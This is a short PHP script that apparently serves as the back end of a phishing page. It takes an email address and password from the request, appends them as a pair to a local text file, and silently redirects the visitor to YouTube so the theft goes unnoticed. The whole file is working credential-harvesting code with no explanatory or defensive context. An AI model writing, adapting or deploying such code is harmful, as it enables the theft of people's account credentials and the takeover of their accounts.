<?PHP

$Log = $_GET['email'];

$Pass = $_GET['pass'];

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://youtube.com'></head></html>";

?>